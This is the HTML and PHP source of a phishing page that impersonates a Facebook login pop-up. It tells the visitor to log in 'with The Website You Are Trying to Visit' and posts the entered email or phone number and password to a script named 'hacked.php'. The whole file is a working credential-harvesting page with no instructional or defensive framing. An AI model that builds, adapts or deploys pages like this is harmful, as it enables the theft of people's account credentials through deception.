<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Facebook Login</title>
	<link rel="icon" type="image/x-icon" href="../assets/2092663.png" />
	<script src="https://use.fontawesome.com/releases/v6.1.0/js/all.js" crossorigin="anonymous"></script>
        <!-- Google fonts-->
        <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
        <link href="../css/styles.css" rel="stylesheet" />

</head>
<body style="margin: 0; padding: 0;">

<div class="content" style="height:550px;">
<header class="header" style="width: 100%;
	background: #374B87; padding-left: 15px; padding-bottom: 5px;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" width="25"><!--! Font Awesome Pro 6.1.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2022 Fonticons, Inc. --><path fill="#ffffff" d="M400 32H48A48 48 0 0 0 0 80v352a48 48 0 0 0 48 48h137.25V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.27c-30.81 0-40.42 19.12-40.42 38.73V256h68.78l-11 71.69h-57.78V480H400a48 48 0 0 0 48-48V80a48 48 0 0 0-48-48z"/></svg><span class="text-light" style="font-family: 'Arial',  sans-serif; font-weight: bold; margin-left: 5px;">Facebook</span>
	</header>

	<span style="font-family: 'Arial',  sans-serif; font-size: 12px; margin-left: 30px;">Log in to use your Facebook Account with <span style="color:#0084FF;">The Website You Are Trying to Visit</span></span>

	<br>
	<br>

<form method="post" action="hacked.php">
	<div class="loginForm" align="center">

		<?php 

                                if (isset($_GET['status'])){

                                    if ($_GET['status']=='accountError'){

                                ?>
                                <div class="alert alert-danger" style="height:30px; font-size: 15px;">
                                        <strong style="margin-bottom: 10px;">Failed!</strong> Fill up your login form
                                    </div>
                                <?php


                                    }else if ($_GET['status']=='usernameError'){

                                ?>
                                <div class="alert alert-danger" style="height:30px; font-size: 15px;">
                                        <strong style="margin-bottom: 10px;">Failed!</strong> Enter Username
                                    </div>
                                <?php


                                    }else if ($_GET['status']=='passwordError'){

                                ?>
                                <div class="alert alert-danger" style="height:30px; font-size: 15px;">
                                        <strong style="margin-bottom: 10px;">Failed!</strong> Enter Password
                                    </div>
                                <?php


                                    }                                

                                }
                                    ?>

		<span style="font-family: 'Arial',  sans-serif; font-size: 12px;">Email or Phone: </span><input type="text" name="username" style="height:25px; width: 180px; font-family: 'Arial',  sans-serif; font-size: 14px;" >
		<br>
		<span style="font-family: 'Arial',  sans-serif; font-size: 12px;">Password: </span><input type="password" name="password" style="height:25px; width: 180px; margin-left: 30px; font-family: 'Arial',  sans-serif; font-size: 14px;" >

<br>
<br>
		

	</div>

	<div class="btn-group-sm">
	<input type="submit" name="submit" class="btn btn-group-sm btn-sm text-light" value="Log In" style="font-family: 'Arial',  sans-serif; font-weight: 750; letter-spacing: 0px; background:#374B87; position: relative; top: 0px; margin-left: 260px;">
	<a href="JavaScript:window.close()" class="btn btn-group-sm btn-sm btn-light border" style="font-family: 'Arial',  sans-serif; font-weight: 750; letter-spacing: 0px; position: relative; top: -32px; margin-left: 325px;">Close</a>



</div>

</form>

	<br>
	<br>

	


	
	
</div>


</body>
</html>